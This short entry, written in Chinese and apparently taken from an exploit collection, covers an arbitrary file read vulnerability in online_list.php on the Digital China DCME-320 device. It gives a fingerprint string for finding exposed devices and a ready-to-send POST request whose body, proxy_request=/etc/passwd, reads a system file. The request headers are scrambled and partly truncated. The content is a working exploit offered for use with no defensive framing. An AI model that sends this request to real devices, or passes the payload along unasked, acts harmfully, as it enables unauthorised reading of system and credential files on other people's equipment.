# 神州数码DCME-320online_list.php任意文件读取漏洞

- **系统**：神州数码DCME-320online_list.php　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`"style/blue/css/dcn_ui.css"`
- **请求**：`POST /function/auth/user/online_list.php HTTP/1.1`

**请求体 / payload**
```
mage/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Length: 29
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=87bb250979fc82ca898020dfcdadeaf3
Host: 127.0.0.1
KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
proxy_request=/etc/passwd
```
- **预期**：200　|　—